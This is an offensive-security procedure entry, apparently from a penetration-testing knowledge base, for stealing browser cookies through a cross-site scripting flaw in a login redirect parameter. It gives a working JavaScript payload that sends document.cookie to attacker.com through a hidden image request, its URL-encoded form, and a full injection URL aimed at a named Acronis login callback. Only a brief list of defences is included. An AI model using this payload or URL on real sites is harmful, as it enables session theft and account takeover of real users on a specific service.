---
tags:
  - xss
  - exfiltration
  - cookie-theft
type: procedure
tools: []
tactics:
  - '[[Collection]]'
  - '[[Execution]]'
commands:
  - '[[commands/exfiltrate-cookies-via-image]]'
platforms:
  - Web
techniques:
  - '[[JavaScript]]'
  - '[[Exfiltration Over Command and Control Channel]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: def5d791-c2a5-4408-8bef-693962761770
created_at: '2025-12-13T23:55:06.832Z'
updated_at: '2025-12-13T23:55:06.832Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Collection]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Exfiltration Over Command and Control Channel]]'
---
# Demonstrate-Cookie-Exfiltration

## Summary

This procedure demonstrates exfiltrating cookies from the victim's browser to an attacker-controlled server using an XSS payload that creates a hidden image request.

## Description

To bypass alert visibility, use a dynamic Image object to send cookies via GET to attacker.com. Encoding handles URL safety. Despite HttpOnly, other cookies may leak for account takeover. Target: Acronis redirect. Outcomes: Data sent to attacker, logged for analysis.

## Requirements

1. Control of an external server (e.g., attacker.com with logging)
2. URL encoding tool
3. Prior XSS confirmation

## Defense

Defensive measures and detection strategies:

- Validate and escape all redirect parameters
- Monitor outbound requests from web apps
- Employ WAF rules for javascript: and suspicious domains

## Objectives

1. Silently exfiltrate accessible cookies
2. Enable remote data collection
3. Simulate real attack for impact assessment

## Instructions

### Step 1: Prepare Exfiltration Payload

**Context**: Create Image-based sender.

**Command** ([[commands/exfiltrate-cookies-via-image]]):

```javascript
javascript:var img = new Image(); img.src = 'https://attacker.com/steal-cookie?cookie=' + document.cookie;
```

> Encoded: `javascript:var%20img%20%3D%20new%20Image()%3B%20img.src%20%3D%20'https%3A%2F%2Fattacker.com%2Fsteal-cookie%3Fcookie%3D'%20%2B%20document.cookie%3B`. Expected: Request to server with cookies.

### Step 2: Inject and Monitor

**Context**: Use in URL and capture traffic.

**Command** ([[commands/exfiltrate-cookies-via-image]]):

Full URL:

```url
https://portal.acronis.com/portal/login-callback?redirectUrl=javascript:var%20img%20%3D%20new%20Image()%3B%20img.src%20%3D%20'https%3A%2F%2Fattacker.com%2Fsteal-cookie%3Fcookie%3D'%20%2B%20document.cookie%3B
```

> Trigger login; check server logs. Success: Cookie query received.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]
- [[Execution]]

### Techniques

- [[JavaScript]]
- [[Exfiltration Over Command and Control Channel]]

### Sub-Techniques


## Commands Used

- [[commands/exfiltrate-cookies-via-image]]

## Tools Used


## Tags

- [[xss]]
- [[Exfiltration]]
